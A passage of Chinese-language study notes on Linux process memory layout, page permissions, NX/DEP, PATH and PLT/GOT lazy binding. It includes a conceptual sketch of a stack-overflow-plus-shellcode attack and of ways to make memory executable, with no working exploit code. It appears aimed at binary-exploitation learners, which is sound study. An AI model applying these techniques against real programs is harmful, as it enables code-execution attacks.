+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数调用信息</span><br><span class="line">局部变量</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>x</code> 在 <strong>stack</strong>。</p>
+<p>函数调用时栈里还会有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return address</span><br><span class="line">saved rbp</span><br><span class="line">局部变量</span><br></pre></td></tr></table></figure>
+<p>特点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">向低地址增长</span><br></pre></td></tr></table></figure>
+<p>权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rw-</span><br></pre></td></tr></table></figure>
+<p>因为 <strong>NX 保护</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack 不允许执行</span><br></pre></td></tr></table></figure>
+<h3 id="shared-libraries-mmap"><a href="#shared-libraries-mmap" class="headerlink" title="shared libraries / mmap"></a>shared libraries / mmap</h3><!--more-->
+<p>存放：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc</span><br><span class="line">libstdc++</span><br><span class="line">ld.so</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.so</span><br></pre></td></tr></table></figure>
+<p>函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf</span><br><span class="line">system</span><br><span class="line">malloc</span><br></pre></td></tr></table></figure>
+<p>都在这里。</p>
+<p>权限通常：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r-x</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="完整权限总结"><a href="#完整权限总结" class="headerlink" title="完整权限总结"></a>完整权限总结</h3><!--more-->
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>区域</th>
+<th>作用</th>
+<th>权限</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>text</td>
+<td>程序代码</td>
+<td>r-x</td>
+</tr>
+<tr>
+<td>rodata</td>
+<td>只读数据</td>
+<td>r—</td>
+</tr>
+<tr>
+<td>data</td>
+<td>初始化全局变量</td>
+<td>rw-</td>
+</tr>
+<tr>
+<td>bss</td>
+<td>未初始化全局变量</td>
+<td>rw-</td>
+</tr>
+<tr>
+<td>heap</td>
+<td>动态内存</td>
+<td>rw-</td>
+</tr>
+<tr>
+<td>stack</td>
+<td>函数调用</td>
+<td>rw-</td>
+</tr>
+<tr>
+<td>shared libs</td>
+<td>动态库</td>
+<td>r-x</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>看几个 C++ 例子：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global = <span class="number">10</span>;</span><br><span class="line">data</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global;</span><br><span class="line">bss</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span>* s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="string">&quot;hello&quot;</span> → rodata</span><br><span class="line">s → data</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">x → stack</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line">p → stack</span><br><span class="line">*p → heap</span><br></pre></td></tr></table></figure>
+<p>很多攻击都是针对不同区域：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>攻击</th>
+<th>区域</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>stack overflow</td>
+<td>stack</td>
+</tr>
+<tr>
+<td>heap overflow</td>
+<td>heap</td>
+</tr>
+<tr>
+<td>ret2libc</td>
+<td>libc</td>
+</tr>
+<tr>
+<td>ROP</td>
+<td>text / libc</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br></pre></td></tr></table></figure>
+<p>在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.text</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="用工具查看程序内存布局"><a href="#用工具查看程序内存布局" class="headerlink" title="用工具查看程序内存布局"></a>用工具查看程序内存布局</h3><!--more-->
+<p>Linux 可以用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/PID/maps</span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00400000-00401000 r-x  text</span><br><span class="line">00600000-00601000 rw-  data</span><br><span class="line">7ffff7dd0000 r-x  libc</span><br><span class="line">7ffffffde000 rw-  stack</span><br></pre></td></tr></table></figure>
+<h3 id="一句话记忆"><a href="#一句话记忆" class="headerlink" title="一句话记忆"></a>一句话记忆</h3><!--more-->
+<p>程序主要区域：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">text   → 代码</span><br><span class="line">rodata → 常量</span><br><span class="line">data   → 初始化全局变量</span><br><span class="line">bss    → 未初始化全局变量</span><br><span class="line">heap   → 动态内存</span><br><span class="line">stack  → 函数调用</span><br></pre></td></tr></table></figure>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>区域</th>
+<th>默认权限</th>
+<th>是否可执行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>text</td>
+<td>r-x</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>rodata</td>
+<td>r—</td>
+<td>✖</td>
+</tr>
+<tr>
+<td>data</td>
+<td>rw-</td>
+<td>✖</td>
+</tr>
+<tr>
+<td>bss</td>
+<td>rw-</td>
+<td>✖</td>
+</tr>
+<tr>
+<td>heap</td>
+<td>rw-</td>
+<td>✖</td>
+</tr>
+<tr>
+<td>stack</td>
+<td>rw-</td>
+<td>✖（NX保护未开启除外）</td>
+</tr>
+<tr>
+<td>libc.text</td>
+<td>r-x</td>
+<td>✔</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="什么时候-bss-heap-stack-可以执行？"><a href="#什么时候-bss-heap-stack-可以执行？" class="headerlink" title="什么时候 bss / heap / stack 可以执行？"></a>什么时候 bss / heap / stack 可以执行？</h3><!--more-->
+<p>默认：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能执行</span><br></pre></td></tr></table></figure>
+<p>但有几种情况可以执行。</p>
+<hr>
+<h4 id="情况1：NX关闭"><a href="#情况1：NX关闭" class="headerlink" title="情况1：NX关闭"></a>情况1：NX关闭</h4><!--more-->
+<p>如果程序编译时关闭 NX：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-z execstack</span><br></pre></td></tr></table></figure>
+<p>那么：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack = rwx</span><br></pre></td></tr></table></figure>
+<p>此时可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode → stack</span><br></pre></td></tr></table></figure>
+<p>执行。</p>
+<hr>
+<h4 id="情况2：mprotect-修改权限"><a href="#情况2：mprotect-修改权限" class="headerlink" title="情况2：mprotect 修改权限"></a>情况2：mprotect 修改权限</h4><!--more-->
+<p>程序可以调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect</span><br></pre></td></tr></table></figure>
+<p>把内存页改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rwx</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(heap_page, size, PROT_READ | PROT_WRITE | PROT_EXEC)</span><br></pre></td></tr></table></figure>
+<p>此时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap 可执行</span><br></pre></td></tr></table></figure>
+<p>这在 <strong>JIT / JavaScript 引擎</strong> 中经常发生。</p>
+<hr>
+<h4 id="情况3：mmap-创建可执行内存"><a href="#情况3：mmap-创建可执行内存" class="headerlink" title="情况3：mmap 创建可执行内存"></a>情况3：mmap 创建可执行内存</h4><!--more-->
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC)</span><br></pre></td></tr></table></figure>
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RWX内存</span><br></pre></td></tr></table></figure>
+<p>攻击者也经常利用这个。</p>
+<h2 id="什么是-NX"><a href="#什么是-NX" class="headerlink" title="什么是 NX"></a>什么是 NX</h2><!--more-->
+<p><strong>NX = No eXecute</strong></p>
+<p>意思是：</p>
+<blockquote>
+<p><strong>某一块内存可以读写，但不能执行代码</strong></p>
+</blockquote>
+<p>也叫：</p>
+<ul>
+<li><strong>DEP（Data Execution Prevention）</strong></li>
+<li><strong>XD bit（Intel）</strong></li>
+<li><strong>NX bit（AMD）</strong></li>
+</ul>
+<p>本质就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给内存页增加一个“是否允许执行”的标志</span><br></pre></td></tr></table></figure>
+<p>在早期系统里，内存通常只有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R 读</span><br><span class="line">W 写</span><br></pre></td></tr></table></figure>
+<p>但没有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X 执行</span><br></pre></td></tr></table></figure>
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈既可以写数据，也可以执行代码</span><br></pre></td></tr></table></figure>
+<p>这就导致经典攻击：</p>
+<p><strong>栈溢出 + shellcode</strong></p>
+<p>例如：</p>
+<p>攻击者输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAA + shellcode</span><br></pre></td></tr></table></figure>
+<p>然后覆盖返回地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return address → shellcode</span><br></pre></td></tr></table></figure>
+<p>程序执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret</span><br><span class="line">↓</span><br><span class="line">跳到栈上的 shellcode</span><br><span class="line">↓</span><br><span class="line">执行 /bin/sh</span><br></pre></td></tr></table></figure>
+<p>攻击成功。</p>
+<p>NX 的核心思想是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据区不能执行</span><br><span class="line">代码区不能写</span><br></pre></td></tr></table></figure>
+<p>也就是：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>内存区域</th>
+<th>权限</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>text</td>
+<td>r-x</td>
+</tr>
+<tr>
+<td>stack</td>
+<td>rw-</td>
+</tr>
+<tr>
+<td>heap</td>
+<td>rw-</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>特别重要：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack: rw-</span><br></pre></td></tr></table></figure>
+<p>意味着：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈不能执行代码</span><br></pre></td></tr></table></figure>
+<h2 id="bin-是什么"><a href="#bin-是什么" class="headerlink" title="/bin 是什么"></a><code>/bin</code> 是什么</h2><!--more-->
+<p><code>/bin</code> 是 Linux 文件系统中的一个目录。</p>
+<p>完整路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin</span><br></pre></td></tr></table></figure>
+<p>它的作用是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存放最基本的系统命令</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/ls</span><br><span class="line">/bin/cat</span><br><span class="line">/bin/mv</span><br><span class="line">/bin/cp</span><br><span class="line">/bin/echo</span><br></pre></td></tr></table></figure>
+<p>你可以在终端看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /bin</span><br></pre></td></tr></table></figure>
+<p>你会看到一大堆命令。</p>
+<p>Linux 有一个环境变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH</span><br></pre></td></tr></table></figure>
+<p>它表示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell 在哪里查找可执行程序</span><br></pre></td></tr></table></figure>
+<p>查看方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>
+<p>你可能看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
+<p>意思是：</p>
+<p>当你输入一个命令时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p>shell 会按顺序查找：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin/ls</span><br><span class="line">/usr/local/bin/ls</span><br><span class="line">/usr/sbin/ls</span><br><span class="line">/usr/bin/ls</span><br><span class="line">/sbin/ls</span><br><span class="line">/bin/ls</span><br></pre></td></tr></table></figure>
+<p>找到就执行。</p>
+<p>因为真实程序在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ls</span><br></pre></td></tr></table></figure>
+<p>但由于 <code>/bin</code> 在 PATH 中，所以你只需要输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p>shell 自动帮你找到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ls</span><br></pre></td></tr></table></figure>
+<p>然后执行。</p>
+<h2 id="PLT与GOT"><a href="#PLT与GOT" class="headerlink" title="PLT与GOT"></a>PLT与GOT</h2><!--more-->
+<p>一个 ELF 程序加载到内存后大概是这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">│</span><br><span class="line">│  stack</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│  mmap</span><br><span class="line">│  shared libraries</span><br><span class="line">│  (libc.so)</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│  heap  ↑</span><br><span class="line">│        ↑ 向高地址增长</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│  bss</span><br><span class="line">│  data</span><br><span class="line">│  rodata</span><br><span class="line">│  got</span><br><span class="line">│  plt</span><br><span class="line">│  text</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+<p>关键点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt 和 got 在程序内部</span><br><span class="line">通常靠近 text/data 段</span><br></pre></td></tr></table></figure>
+<h3 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h3><!--more-->
+<p>PLT 全称：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Procedure Linkage Table</span><br><span class="line">过程链接表</span><br></pre></td></tr></table></figure>
+<p>作用一句话：</p>
+<p>PLT 是调用外部函数的跳板，让程序在运行时调用动态库函数</p>
+<p>因为程序里的函数可能来自：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.so</span><br></pre></td></tr></table></figure>
+<p>比如程序写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>
+<p>编译后不会直接调用 libc 的 <code>puts</code>，而是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br></pre></td></tr></table></figure>
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用 PLT 表里的入口</span><br></pre></td></tr></table></figure>
+<h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><!--more-->
+<p>GOT 全称：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Global Offset Table</span><br></pre></td></tr></table></figure>
+<p>作用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存储外部函数的真实地址</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@got → libc puts 地址</span><br></pre></td></tr></table></figure>
+<h3 id="PLT-GOT-如何配合"><a href="#PLT-GOT-如何配合" class="headerlink" title="PLT + GOT 如何配合"></a>PLT + GOT 如何配合</h3><!--more-->
+<p>第一次调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br></pre></td></tr></table></figure>
+<p>流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">程序</span><br><span class="line"> ↓</span><br><span class="line">puts@plt</span><br><span class="line"> ↓</span><br><span class="line">GOT</span><br><span class="line"> ↓</span><br><span class="line">动态链接器 ld.so</span><br><span class="line"> ↓</span><br><span class="line">找到 libc puts</span><br><span class="line"> ↓</span><br><span class="line">写入 GOT</span><br></pre></td></tr></table></figure>
+<p>第二次调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br></pre></td></tr></table></figure>
+<p>流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts@plt</span><br><span class="line"> ↓</span><br><span class="line">GOT</span><br><span class="line"> ↓</span><br><span class="line">libc puts</span><br></pre></td></tr></table></figure>
+<p>不用再解析。</p>
+<p>我们用一个例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>编译后变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br></pre></td></tr></table></figure>
+<p>当程序刚加载到内存时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@got 还没有 libc puts 的真实地址</span><br></pre></td></tr></table></figure>
+<p>它里面存的其实是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@plt+6</span><br></pre></td></tr></table></figure>
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下一条 plt 指令</span><br></pre></td></tr></table></figure>
+<p>所以 GOT 初始状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@got → puts@plt+6</span><br></pre></td></tr></table></figure>
+<p>假设：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts@plt = 0x401030</span><br><span class="line">puts@got = 0x404018</span><br></pre></td></tr></table></figure>
+<p><code>puts@plt</code> 实际汇编类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts@plt:</span><br><span class="line">    jmp [puts@got]      ; 1</span><br><span class="line">    push relocation_id  ; 2</span><br><span class="line">    jmp plt0            ; 3</span><br></pre></td></tr></table></figure>
+<p>而：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt0</span><br></pre></td></tr></table></figure>
+<p>是所有函数共享的入口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt0:</span><br><span class="line">    push GOT+8</span><br><span class="line">    jmp [GOT+16]</span><br></pre></td></tr></table></figure>
+<p>这里会进入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld.so</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="第一次调用-puts-时发生什么"><a href="#第一次调用-puts-时发生什么" class="headerlink" title="第一次调用 puts 时发生什么"></a>第一次调用 puts 时发生什么</h4><!--more-->
+<p>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call puts@plt</span><br></pre></td></tr></table></figure>
+<p>CPU进入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@plt</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp [puts@got]</span><br></pre></td></tr></table></figure>
+<p>此时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@got = puts@plt+6</span><br></pre></td></tr></table></figure>
+<p>所以跳转到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts@plt+6</span><br></pre></td></tr></table></figure>
+<p>也就是第二条指令。</p>
+<p>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push relocation_id</span><br></pre></td></tr></table></figure>
+<p>这个 ID 用来告诉动态链接器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我要解析哪个函数</span><br></pre></td></tr></table></figure>
+<p>然后执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp plt0</span><br></pre></td></tr></table></figure>
+<p>跳到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt0</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="进入动态链接器"><a href="#进入动态链接器" class="headerlink" title="进入动态链接器"></a>进入动态链接器</h4><!--more-->
+<p><code>plt0</code> 会调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld.so</span><br></pre></td></tr></table></figure>
+<p>也就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dynamic_resolve</span><br></pre></td></tr></table></figure>
+<p>动态链接器会：</p>
+<p>1️⃣ 查 <code>.rela.plt</code> 重定位表</p>
+<p>2️⃣ 找到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts</span><br></pre></td></tr></table></figure>
